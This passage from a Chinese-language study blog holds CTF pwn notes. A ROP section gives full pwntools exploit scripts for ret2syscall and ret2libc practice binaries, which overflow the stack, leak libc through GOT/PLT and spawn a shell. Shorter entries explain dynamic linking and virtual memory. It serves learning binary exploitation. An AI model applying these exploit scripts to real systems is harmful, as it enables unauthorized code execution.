class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&#x27;./rop&#x27;</span>)</span><br><span class="line">pop_eax_ret = <span class="number">0x080bb196</span></span><br><span class="line">pop_edx_ecx_ebx_ret = <span class="number">0x0806eb90</span></span><br><span class="line">int_0x80 = <span class="number">0x08049421</span></span><br><span class="line">binsh = <span class="number">0x80be408</span></span><br><span class="line">payload = flat([<span class="string">&#x27;A&#x27;</span> * (<span class="number">0xffffd148</span>-<span class="number">0xffffd0dc</span>+<span class="number">4</span>), pop_eax_ret, <span class="number">0xb</span>, pop_edx_ecx_ebx_ret, <span class="number">0</span>, <span class="number">0</span>, binsh, int_0x80])</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="ret2libc1"><a href="#ret2libc1" class="headerlink" title="ret2libc1"></a>ret2libc1</h2><p><em>“system和&#x2F;bin&#x2F;sh分床了，这可怎么办？”</em></p><p>经典操作<br><img src="https://gateway.pinata.cloud/ipfs/bafkreibogkbi32mz557a25yhsskj4dmze2pcn6gtm5u4abw6kofp5kcmja" alt="1"><br><img src="https://gateway.pinata.cloud/ipfs/bafkreiguzbxmsejrmah7q66eyi74utjwdi7cwsj7gi7bwvecb2luhgfxue" alt="1"><br>开启了nx保护<br>有栈溢出，有&#x2F;bin&#x2F;sh，甚至还有system，但是此时system体内塞入了别的字符串<del>什么渣…</del><br>这时，我们就要用到plt表和got表了。<br>基本思路：利用栈溢出跳转到plt表中的system项，然后再通过其调用system函数，并传入参数”&#x2F;bin&#x2F;sh”，然后获得shell。<br>exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&#x27;./ret2libc1&#x27;</span>)</span><br><span class="line">binsh_addr = <span class="number">0x8048720</span></span><br><span class="line">system_plt = <span class="number">0x08048460</span></span><br><span class="line">payload = flat([<span class="string">&#x27;a&#x27;</span> * (<span class="number">0xffffd148</span>-<span class="number">0xffffd0dc</span>+<span class="number">4</span>), system_plt, <span class="string">&#x27;aaaa&#x27;</span>, binsh_addr])</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>其中填入aaaa是为了返回一个虚假地址（在栈上占个位置用的）</p><h2 id="ret2libc2"><a href="#ret2libc2" class="headerlink" title="ret2libc2"></a>ret2libc2</h2><p><em>“&#x2F;bin&#x2F;sh被气走了，这可怎么办？”</em></p><p>还是经典操作（图懒得给了，<del>切屏切到手酸</del>）</p><p>总之有栈溢出，有buf2在.bss段，有gets函数，可以手动构造一个&#x2F;bin&#x2F;sh，然后再调用system函数，跟ret2libc1差不多</p><p>exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&#x27;./ret2libc2&#x27;</span>)</span><br><span class="line">gets_plt = <span class="number">0x08048460</span></span><br><span class="line">system_plt = <span class="number">0x08048490</span></span><br><span class="line">pop_ebx_ret = <span class="number">0x0804843d</span></span><br><span class="line">buf2 = <span class="number">0x804a080</span></span><br><span class="line">payload = flat([<span class="string">&#x27;a&#x27;</span> * (<span class="number">0xffffd148</span>-<span class="number">0xffffd0dc</span>+<span class="number">4</span>), gets_plt, pop_ebx_ret, buf2, system_plt, <span class="string">&#x27;aaaa&#x27;</span>, buf2])</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>其中，pop_ebx_ret起到两个作用，一个是充当gets函数的返回地址，另一个是它本身功能：将buf2从栈上pop掉，然后返回到system_plt，维持栈平衡<br>当然这里还有另外一种写法，即</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = flat([<span class="string">&#x27;a&#x27;</span> * (<span class="number">0xffffd148</span>-<span class="number">0xffffd0dc</span>+<span class="number">4</span>), gets_plt,system_plt, buf2, buf2])</span><br></pre></td></tr></table></figure><p>这样写，system_plt可以直接充当gets函数的返回地址，gets执行完毕后直接跳转到system_plt，然后先前栈上的buf2刚好充当system_plt的虚假返回地址（刚刚没有pop掉）</p><h2 id="ret2libc3"><a href="#ret2libc3" class="headerlink" title="ret2libc3"></a>ret2libc3</h2><p><em>“emmm没有sh也没有system，可利用的指令碎片也基本没有，这可真令人难受”</em></p><p>&emsp;&emsp;开启了nx保护，存在栈溢出，似乎没有别的东西了，怎么找到system函数地址呢？system函数属于libc，而libc.so 动态链接库中的函数之间相对偏移是固定的，那么只要得到libc中某个函数的地址，我们就可以得出system函数的地址<br>&emsp;&emsp;我们采用got表来泄露目标函数地址，由于libc的<strong>延迟绑定机制</strong>，我们需要泄漏已经执行过的函数的地址。本题我们泄露__libc_start_main函数的地址</p><p><del>emmmLibcSearcher这个工具不太好用，写这题的时候它并没有找到所需libc版本</del></p><p>这里推荐两个网站<br><a href="https://libc.rip/">https://libc.rip/</a><br><a href="https://libc.blukat.me/">https://libc.blukat.me/</a><br>这两个网站可以通过输入函数和对应地址末三位来查找当前使用的libc版本，并得到函数偏移量<br>如图<br><img src="https://gateway.pinata.cloud/ipfs/bafkreiag7xsvssereo2odwqt4citu5aayu6tyzhqk3sbtcjojwnpkhrtme" alt="0"><br>有时候查找出来的libc版本会比较多，建议多加几个函数进去（条件允许的话），然后一个个试<br>exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./ret2libc3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ret2libc3 = ELF(<span class="string">&#x27;./ret2libc3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = ret2libc3.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">libc_start_main_got = ret2libc3.got[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">main = ret2libc3.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = flat([<span class="string">b&#x27;A&#x27;</span> * <span class="number">112</span>, puts_plt, main, libc_start_main_got])<span class="comment">##泄露libc_start_main函数地址，并在泄露后回到main函数，即重新执行一遍程序</span></span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;Can you find it !?&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">libc_start_main_addr = u32(sh.recv()[<span class="number">0</span>:<span class="number">4</span>]) <span class="comment">##接收libc_start_main函数地址</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_start_main_addr)) <span class="comment">##打印出libc_start_main函数地址，为了人工判断libc版本，以便在之后填入各个函数的偏移（所以确乎是要与主机交互两遍）</span></span><br><span class="line">libc_start_main=<span class="number">0x021560</span> <span class="comment">##纯手打hhh</span></span><br><span class="line">system=<span class="number">0x047cb0</span></span><br><span class="line">binsh=<span class="number">0x1b90f5</span></span><br><span class="line">libcbase = libc_start_main_addr - libc_start_main</span><br><span class="line">system_addr = libcbase + system</span><br><span class="line">binsh_addr = libcbase + binsh</span><br><span class="line"></span><br><span class="line">payload = flat([<span class="string">b&#x27;A&#x27;</span> * <span class="number">104</span>, system_addr, <span class="number">0xdeadbeef</span>, binsh_addr])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>后补：最近发现这个查偏移的网站好像用不了，然后加个给了libc的情况的exp（一般会给吧）,下面是打本地的情况</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf=ELF(<span class="string">&quot;./ret2libc3&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;/lib32/libc.so.6&quot;</span>)</span><br><span class="line">io=process(<span class="string">&quot;./ret2libc3&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot; it !?&quot;</span>)</span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">start_addr = elf.symbols[<span class="string">&#x27;_start&#x27;</span>]</span><br><span class="line">payload=cyclic(<span class="number">112</span>)+p32(puts_plt)+p32(start_addr)+p32(puts_got)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">puts_realaddr=u32(io.recv()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_realaddr))</span><br><span class="line">libc_addr=puts_realaddr-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system_addr=libc_addr+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_addr=libc_addr+<span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line">payload=cyclic(<span class="number">112</span>)+p32(system_addr)+p32(<span class="number">0xdeadbeef</span>)+p32(binsh_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>本地libc版本查找方式：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldd filename</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/GNchen1/Pages/main/Img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-07-24%20115222.png" alt="a"></p><p>And<br>像puts这些函数的got地址plt地址可以手动查询，通过ida（ctrl+s）<br>要注意got地址是.got.plt 而不是.got ， plt地址在.plt.sec 而不是.plt</p><p><img src="https://raw.githubusercontent.com/GNchen1/Pages/main/Img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-07-24%20195621.png" alt="a"></p><h3 id="64位的情况"><a href="#64位的情况" class="headerlink" title="64位的情况"></a>64位的情况</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf=ELF(<span class="string">&quot;./ret2libc_64&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">io=process(<span class="string">&quot;./ret2libc_64&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Pls Input&quot;</span>)</span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">read_got=elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">start_addr = elf.symbols[<span class="string">&#x27;_start&#x27;</span>]</span><br><span class="line">pop_rdi_ret=<span class="number">0x0000000000401293</span></span><br><span class="line">payload=cyclic(<span class="number">40</span>)+p64(pop_rdi_ret)+p64(read_got)+p64(puts_plt)+p64(start_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">read_realaddr=u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) <span class="comment">#read函数的真实地址，由于真实地址总是从7f开始，故从7f开始接收，长度补足8个字节</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(read_realaddr))</span><br><span class="line">libc_addr=read_realaddr-libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">system_addr=libc_addr+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_addr=libc_addr+<span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line">ret_addr=<span class="number">0x000000000040101a</span></span><br><span class="line">payload=cyclic(<span class="number">40</span>)+p64(ret_addr)+p64(pop_rdi_ret)+p64(binsh_addr)+p64(system_addr)+p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>总体上差不多，就是传参方式改变，前六个参数分别给rdi rsi rdx rcx r8 r9，以及需要注意栈对齐（第二个payload的ret就是为了栈对齐）</p><h2 id="ret2reg"><a href="#ret2reg" class="headerlink" title="ret2reg"></a>ret2reg</h2><p>顾名思义，就是控制程序执行流返回到寄存器。首先需要知道执行ret时（栈溢出后）指向缓冲区空间的是哪个寄存器，其次往缓冲区写入shellcode，然后将call [寄存器] 或者jmp [寄存器]指令地址填入retaddress，利用栈溢出完成攻击<br>实现前提，该缓冲区是RWX的</p>]]></content>
      
      
      <categories>
          
          <category> Stack </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ROP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>堆相关</title>
      <link href="/2024/03/19/%E5%A0%86%E7%9B%B8%E5%85%B3/"/>
      <url>/2024/03/19/%E5%A0%86%E7%9B%B8%E5%85%B3/</url>
      
        <content type="html"><![CDATA[<p><em>仅供个人学习参考</em>  </p><span id="more"></span><p><img src="https://gateway.pinata.cloud/ipfs/bafkreibceromkvwouskhvxcvhbmiut75yhftpwm7xhty5j7ruwqbngfeuu" alt="0"></p>]]></content>
      
      
      <categories>
          
          <category> Heap </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 堆 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>动态链接相关</title>
      <link href="/2024/03/18/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/"/>
      <url>/2024/03/18/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/</url>
      
        <content type="html"><![CDATA[<p><em>仅供个人学习参考</em>  </p><span id="more"></span><h2 id="为什么要动态链接-动态链接基本思想"><a href="#为什么要动态链接-动态链接基本思想" class="headerlink" title="为什么要动态链接&amp;&amp;动态链接基本思想"></a>为什么要动态链接&amp;&amp;动态链接基本思想</h2><p>&emsp;&emsp;静态链接对于计算机内存和磁盘空间的浪费十分严重，且一旦程序中有任何模块更新，整个程序就需要重新链接后再发布给用户，用户每次都需要重新下载这个程序<del>试想一下每次崩铁更新都要重新下载几十个G的文件那得多崩溃</del>动态链接很好的优化了以上两个问题。<br>&emsp;&emsp;其基本思想如下：把程序的各个模块分割成独立的文件，等到程序要运行时再将他们链接在一起，也就是将链接过程推迟。假设我们有program1.o、program2.o和lib.o三个目标文件。program1.o用到了lib.o，即program1.o依赖于lib.o，那么系统就会加载lib.o，如果他们还依赖于其他目标文件，那操作系统就再加载用到的文件，之后再进行链接工作，之后我们如果还需运行program2，系统只需加载program2，因为内存中已经存在一份lib.o<br>&emsp;&emsp;在Linux系统中，elf动态链接文件被称为<strong>动态共享对象</strong>（DSO，Dynamic Shared Objects），简称<strong>共享对象</strong>，一般以.so为扩展名。在Windows系统中则以.dll为扩展名（动态链接库）</p><h2 id="地址无关代码-PIC"><a href="#地址无关代码-PIC" class="headerlink" title="地址无关代码 (PIC)"></a>地址无关代码 (PIC)</h2><p>&emsp;&emsp;共享对象的最终装载地址在编译时是不确定的，那么我们如何确定它在进程虚拟空间中的位置？早期人们采用静态共享库，即手工分配各个模块的装载地址，但是单一个模块被多个程序使用，就容易导致地址冲突。比如模块a被一个人分配到0x1000到0x2000的位置，但是另外一个人用不到a，以为0x1000到0x2000是空闲的，就把b分配进去，这样就起冲突了，以后的人就不能同时使用a和b。<br>&emsp;&emsp;为了解决模块装载时固定地址的问题，我们提出一个设想：共享对象在编译时不能假设自己在进程虚拟空间中的位置。首先想到的方法就是类比静态链接中的重定位，只不过我们将重定位推迟至装载时进行，即<strong>装载时重定位</strong>，又叫<strong>基址重置</strong>。但该方法有个很大的缺点是指令部分无法在多个进程之间共享，这样便失去了动态链接的一大优势。我们的目标是希望指令共享的部分不需要因为装载地址的改变而改变，所以我们将指令部分中需要修改的部分分离出来，与数据部分合并，这样剩余部分可保持不变，而数据部分可以在每个进程中拥有一个副本，这种方法是被称为<strong>地址无关代码</strong>的技术。<br>模块中地址引用方式可分为四种</p><h3 id="类型一-模块内部调用或跳转"><a href="#类型一-模块内部调用或跳转" class="headerlink" title="类型一 模块内部调用或跳转"></a>类型一 模块内部调用或跳转</h3><p>被调函数与调用者都处于同一模块，这种指令不需要重定位，相对地址调用就可以了</p><h3 id="类型二-模块内部数据访问-（比如模块中定义的全局变量、静态变量）"><a href="#类型二-模块内部数据访问-（比如模块中定义的全局变量、静态变量）" class="headerlink" title="类型二 模块内部数据访问 （比如模块中定义的全局变量、静态变量）"></a>类型二 模块内部数据访问 （比如模块中定义的全局变量、静态变量）</h3><p>相对寻址，任何一条指令与它所需要访问的模块的数据之间的相对位置是固定的，只要当前指令地址（pc）加上偏移量就能得出数据地址了</p><h3 id="模块三-模块间数据访问"><a href="#模块三-模块间数据访问" class="headerlink" title="模块三 模块间数据访问"></a>模块三 模块间数据访问</h3><p>这个麻烦点，因为模块间的数据访问目标地址需要等到装载时才决定。elf文件的做法是在数据段内建立一个指向这些变量的指针数组，也称为<strong>全局偏移表</strong>（GOT表），当代码需要引用这些全局变量时，可以通过GOT表中相对应的项来间接引用。<br><img src="https://gateway.pinata.cloud/ipfs/bafkreihcypprhe7hi2662na3wquk27cjoa72yhvuxydholilndilk37pai" alt="got"><br>计算方式：通过pc值加上一个偏移量得到GOT表的位置，再根据变量地址在GOT表中的偏移就可以得到变量的地址</p><h3 id="模块四-模块间调用、跳转-（比如其他模块定义的全局变量）"><a href="#模块四-模块间调用、跳转-（比如其他模块定义的全局变量）" class="headerlink" title="模块四 模块间调用、跳转 （比如其他模块定义的全局变量）"></a>模块四 模块间调用、跳转 （比如其他模块定义的全局变量）</h3><p>同三，就是把变量地址换成函数地址</p><h2 id="PIE"><a href="#PIE" class="headerlink" title="PIE"></a>PIE</h2><p>以地址无关方式编码的可执行文件被称为地址无关可执行文件（PIE）</p><h2 id="延迟绑定"><a href="#延迟绑定" class="headerlink" title="延迟绑定"></a>延迟绑定</h2><p>&emsp;&emsp;在动态链接下，程序模块之间包含了大量的函数调用，所以程序在开始执行前，动态链接会耗费不少时间用于解决模块之间的函数引用的符号查找和重定位，这会牺牲性能。而很多函数在实际运行中很少甚至不会用到，为了提高性能，ELF采用了一种叫做<strong>延迟绑定</strong>的机制。其基本思想就是程序在第一次被用到时才绑定（符号查找、重定位等）<br>&emsp;&emsp;ELF采用PLT（Procedure Linkage Table）的方法来实现。<br><img src="https://gateway.pinata.cloud/ipfs/bafkreif23cst3rfzw36mj7h3wptjifuvgztz4gx5ccjbvkenajvcrnjule" alt="plt"><br>如图，调用函数的方式在got表的基础上再加一层，先通过plt表查询函数在got表对应的项的地址，再通过got表进行间接寻址，如果是第一次调用函数，got表是没有函数地址的，需要plt表去绑定该函数（其中需要用到plt表中的前三个参数），之后got表就有对应函数的地址了。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 动态链接 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浅谈内存管理</title>
      <link href="/2024/03/13/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/"/>
      <url>/2024/03/13/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/</url>
      
        <content type="html"><![CDATA[<p><em>仅供个人学习参考</em>  </p><span id="more"></span><h2 id="虚拟寻址"><a href="#虚拟寻址" class="headerlink" title="虚拟寻址"></a>虚拟寻址</h2><p>&emsp;&emsp;计算机的最基本体系结构就是CPU加上内存，CPU负责计算，内存负责存储临时的计算数据，<del>当然实际的模型要复杂得多</del>，那么，问题来了，CPU如何准确获取内存上的数据呢？<br>&emsp;&emsp;我们先将内存假设成一个字节数组的模型</p><p><img src="https://gateway.pinata.cloud/ipfs/bafkreifcdev7tskluynnkpk2ykvms5ekxazri7fh225reifpifgz34kmsa" alt="1">  </p><p>&emsp;&emsp;很容易可以得出一个简单粗暴的方法——物理寻址。<del>就是照着内存的地址直接找</del>。显然，这种寻址方式会导致许多问题，如不支持多进程同时进行（<em>会导致不同进程之间的越级访问，互相篡改数据啥的</em>）。所以我们现在采取另外一种寻址方式——<strong>虚拟寻址</strong>。<br>&emsp;&emsp;虚拟寻址涉及到另外一个抽象概念——虚拟地址空间。虚拟内存由虚拟地址组织起来，它使得每个进程都单独的使用整个主存（从进程的角度来看），并且每个进程所看到的内存都是一模一样的，该内存空间称为<strong>虚拟地址空间</strong><br><br>&emsp;&emsp;举个栗子<br><br>&emsp;&emsp;如图<br><img src="https://gateway.pinata.cloud/ipfs/bafybeig67xfhfbcb5q3wnc6uwh73zsuh73ir5ngvsvavretrevaipys3qi" alt="2"><br>&emsp;&emsp;其中，DRAM就是我们平时所说的内存（<em>比如某台笔记本的内存为32GB</em>），这个内存是实实在在的物理内存，但是对于每个进程来说，他们所看到的是虚拟内存（对于32位操作系统，其大小为4GB）<del>至于为什么是4GB请自行百度</del><br>&emsp;&emsp;负责虚拟地址到物理地址的转换的是一个叫做MMU( memory manage unit , 虚拟内存管理单元) 的硬件。每当CPU需要访问物理内存时，都会产生一个虚拟地址，这个虚拟地址被 MMU 翻译成物理内存地址。</p><h2 id="内存分段"><a href="#内存分段" class="headerlink" title="内存分段"></a>内存分段</h2><p>&emsp;&emsp;早期人们采用的方法是<strong>内存分段</strong>，即把一段与程序所需空间大小相等的虚拟内存映射到等大小的物理内存上，如图。<br><img src="https://gateway.pinata.cloud/ipfs/bafkreiand6xkgvano4tg6fmtxksflgw4f3a7zy7cffgff42vbil7lyf62u" alt="new"><br>但是这样子做效率低下，倘若内存不够了，需要先将原先内存里暂时不用的段拿出来放到磁盘（因为是对照一整个程序的段，所以这个段会很大，读写费时间）。于是我们采取新的方式————内存分页。</p><h2 id="内存分页"><a href="#内存分页" class="headerlink" title="内存分页"></a>内存分页</h2><p>&emsp;&emsp;为了方便地址的管理和调用，Linux采取内存分页的方式。即将物理内存划分为固定大小的页（物理页【Physical Page】），通常是4KB或者2MB。每个进程的虚拟地址空间也被划分为相同大小的页(虚拟页【Vistural Page】)。通过<strong>页表</strong>（Page Table）来记录虚拟页和物理页的映射关系。当进程访问虚拟地址时，操作系统会根据页表将虚拟页映射到物理页上，从而实现地址转换</p><h3 id="页表（提一嘴）"><a href="#页表（提一嘴）" class="headerlink" title="页表（提一嘴）"></a>页表（提一嘴）</h3><p>页表是一个结构为PTE(Page Table Entry) 的数组。页表中的每一个表项都存储了一个虚拟页到物理页的映射。</p><hr><p>&emsp;&emsp;根据虚拟页是否分配了物理页和是否缓存的角度来区分，虚拟内存页有三种：<br>    （1）.未分配物理页<br>    （2）.已分配物理页但未缓存<br>    （3）.已分配物理页且已缓存</p><p>&emsp;&emsp;（常用的页会放在内存中，不常用的会写入磁盘<del>毕竟内存是有限的嘛</del>）为了区分这三种情况，页表中有一个<ins>有效标志位</ins>,和一个<ins>指向物理内存的地址</ins>。 如果地址为空，表示没有为虚拟页分配对应的物理页（1）。而有效标志位，用于表明是否缓存在DRAM中。如果有效位为1，则表示物理内存页已分配且已缓存（3），此时地址指向DRAM中物理内存页的地址。 如果有效位为0，则表示物理内存页已分配但缓存未命中（2）。<br><img src="https://gateway.pinata.cloud/ipfs/bafybeielcpwjaj3g7lywcwf4i7pc7g6uyimuzdaawuy235fc6rhfuwvryu" alt="3"><br>&emsp;&emsp;上述页表一般是缓存在L1 cache 中的，而MMU到 L1 cache 所需的指令周期也很长，所以MMU自己也做了一个小缓存，叫做翻译后备缓冲器TLB(（translation Lookaside buffer)<del>就是放一些比较常用的在身边方便找</del>。当MMU需要将虚拟内存地址转换为DRAM中的内存地址时，此时先查TLB，如果缓存命中直接就得到了DRAM中的地址，否则就需要到页表中去查。</p><h2 id="缺页异常"><a href="#缺页异常" class="headerlink" title="缺页异常"></a>缺页异常</h2><p>&emsp;&emsp;MMU查询页表，发现该虚拟页在DRAN中没有缓存，此时会触发<strong>缺页异常</strong>。此时程序的控制权转移给一个缺页异常程序，它所作的事情，简单来说就是从DRAM里面挑出一个暂时不用的页，把它写入磁盘，同时把我们所需要的页从磁盘中复制到DRAM里面。<br>&emsp;&emsp;由于程序的局部性原理，<del>进程总是趋向于在一个较小的活动页面集合上工作，这个工作集合或者说常驻集合，在第一次访问的时候被 cache 到 DRAM 中之后，后续都会命中缓存</del>。说白了就是DRAM命中率很高，很少会触发缺页异常，所以不用担心程序的效率问题。<br><img src="https://gateway.pinata.cloud/ipfs/bafybeibvnlisqz64okn3qvkhqtjtgk52edzukla653c4yokhe3xel2ja7q" alt="4"></p><h3 id="页表（再提一嘴）"><a href="#页表（再提一嘴）" class="headerlink" title="页表（再提一嘴）"></a>页表（再提一嘴）</h3><p>&emsp;&emsp;前面说到不同进程之间的越级访问问题，那么页表是如何解决这个问题的呢？<br>&emsp;&emsp;比如下图图中页表添加了3个许可位。SUP表示进程是否必须运行在内核模式才能访问该页。SUP为1 的页在用户态是无法访问的。同时还有读权限和写权限。当某个指令进行越权访问时，CPU就会触发一个段错误。<br><img src="https://gateway.pinata.cloud/ipfs/bafybeiha5qosfz3lkwqw6bhdfdg22dqow6hkywlm6wp3o6y7ddmr24z4z4" alt="5"><br>一般来说，页表可以实现以下的功能：<br>1.每个进程的代码段所在页是不可修改的<br>2.内核的代码和数据结构所在页也是不可修改的<br>3.进程不能读写其他进程的私有内存页<br>4.进程间通信可以通过设置进程间共享页来实现。即允许多个进程对某一页进行读写。</p><h2 id="多级页表-（进一步优化）"><a href="#多级页表-（进一步优化）" class="headerlink" title="多级页表 （进一步优化）"></a>多级页表 （进一步优化）</h2><p>&emsp;&emsp;我们做个计算，页表有多大，一页4KB，虚拟内存空间是4GB，<del>也就是有4GB&#x2F;4KB &#x3D; 10^6 个页，假设一个 PTE 大小是4个字节，页表的大小也达到了 4GB&#x2F;4KB* 4Byte &#x3D; 4MB</del>。由于页表是缓存在 L1 里的，4MB可不是个小数目。而且如果是64 位系统，虚拟内存空间是128 TB ，页表的大小将指数增长。<br>&emsp;&emsp;为了节省内存空间，页表可以采用多级结构。多级页表将整个虚拟地址空间划分为多个层级，每个层级都有自己的页表。通过多级页表，可以减少页表的大小，提高内存利用率。</p><hr><h3 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h3><p><em>大概先这些，后续有补充再更新</em><br><em>图源自网络，如侵删</em></p>]]></content>
      
      
      
        <tags>
            
            <tag> 虚拟内存 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
